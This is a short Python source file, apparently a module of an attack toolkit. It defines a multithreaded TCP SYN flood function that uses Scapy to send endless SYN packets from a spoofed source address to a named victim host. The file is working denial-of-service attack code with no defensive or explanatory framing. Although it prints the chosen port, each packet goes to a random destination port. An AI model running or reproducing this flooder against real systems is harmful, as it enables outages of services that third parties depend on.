import threading
from scapy.all import *
from random import randint
from func.spoof_addr import spoof_addr
import traceback

def SYNflood(victim,port,quiet,THREAD_COUNT,terminal):
    try:
        terminal.write('\n[+] Flooding '+victim+" with TCP SYN packets on port "+str(port))
        all_threads = []
        tc = THREAD_COUNT
        spoofaddr = spoof_addr(terminal=terminal)
        for i in range(tc):
            t = threading.Thread(target=__floodtarget,args=(victim,port,spoofaddr,quiet,terminal))
            t.start()
            all_threads.append(t)
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()

def __floodtarget(victim,port,spoof_addr,quiet,terminal):
    try:
        while 1:
            packet = IP(src=spoof_addr,dst=victim)/TCP(flags='S',sport = randint(1,65535),dport = randint(1,65535))
            send(packet, verbose = 0)
            if not quiet:
                terminal.write('\n[+] Sent packet '+str(packet.show()))
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
